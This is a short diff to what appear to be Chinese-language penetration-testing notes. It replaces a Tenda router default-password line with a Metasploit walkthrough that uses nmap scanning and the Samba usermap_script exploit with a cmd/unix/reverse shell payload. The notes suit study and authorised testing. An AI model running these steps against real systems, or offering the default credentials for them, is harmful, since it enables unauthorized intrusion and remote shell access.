@@ -24,7 +24,39 @@ WPA2加密 抓包穷举密码
 
 ****
 
-Tenda 弱口令 12345678
+**使用Metasploit进行漏洞检测和入侵**
+
+**1、    使用nmap进行端口扫描**  
+
+nmap -sV IP 
+
+获得端口的开放状态和指纹信息 就是服务名称和版本号 之后可以根据这些信息百度看看是不是存在漏洞
+
+ **2、    使用search命令查找相关模块**  
+
+search samba 进行查看端口是不是存在漏洞,查找到excellent或者great的
+
+ **3、    使用use调度模块**   
+
+use exploit/multi/samba/usermap_script。之后使用漏洞模块
+
+**4、    使用info查看模块信息**   
+
+**5、    选择payload作为攻击**   
+
+set payload cmd/unix/reverse
+
+**6、    设置攻击参数**   
+
+首先通过show options或者options，查看需要填写的参数： 其中标红处如果是yes，表示这行参数必须填写，如果是no，就是选填，
+
+**7、    渗透攻击**
+
+exploit
 
 
+
+参考连接:https://blog.csdn.net/wsh19930305/article/details/72855660
+
+****
 
